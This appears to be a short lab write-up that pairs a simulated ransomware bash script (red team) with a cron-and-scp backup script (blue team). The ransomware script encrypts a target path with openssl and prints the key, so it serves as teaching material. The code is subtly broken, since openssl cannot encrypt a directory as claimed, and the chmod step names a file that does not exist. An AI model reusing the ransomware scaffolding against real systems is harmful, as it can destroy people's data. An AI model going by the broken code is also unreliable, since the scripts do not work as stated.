# Data Security

# Red Team
For Red Team we will simulate a ransomware attack. This simple script will encrypt a directory of your choice (actually, we create a new encrypted version and preserve the original one):

```
#!/bin/bash

while getopts ":p:" opt; do
  case $opt in
    p)
      path_to_encrypt=$OPTARG
      ;;
    :)
      exit 1
      ;;
  esac
done

if [ -z "$path_to_encrypt" ]; then
  echo "Please provide a valid path."
  exit 1
fi

if [ ! -d "$path_to_encrypt" ]; then
  echo "The specified path does not exist or is not a directory."
  exit 1
fi

encryption_key=$(openssl rand -base64 32)

openssl enc -aes-256-cbc -salt -in "$path_to_encrypt" -out "$path_to_encrypt.enc" -k "$encryption_key"

echo "The path $path_to_encrypt has been encrypted with AES 256. Encryption key: $encryption_key"
```

And let's run it with `home/kali/Desktop/ransom.sh -p /home/kali/Desktop/toBeEncrypted`. Change the directory you want to encrypt.

# Blue Team
Since decrypting files can be virtually impossible, our best alternative here is to have a backup.

To ensure that we will constant backups being stored in a dedicated server, we will create a script that zips and archives a folder `/home/kali/importantFiles` everyday at midnight, and uploads it to another machine through scp. `nano backup.sh`:

```
#!/bin/bash

sourceDir="/home/kali/importantFiles"
timestamp=$(date +"%Y%m%d_%H%M%S")
zipFilename="importantFiles_$timestamp.tar.gz"
tar -zcvf "$zipFilename" "$sourceDir"

scp "$zipFilename" user@192.168.0.10:/home/backups/kaliBackups/

rm "$zipFilename"
```

Grant it execute permissions with `chmod +x backup_and_transfer.sh` and then let's add it to our crontab `crontab -e`:

```
0 0 * * * /home/kali/backup.sh
```

This way, if our kali machine is compromised, our important files were upload to a different host the night before - working without the data for the previous day is definitely better than losing everything.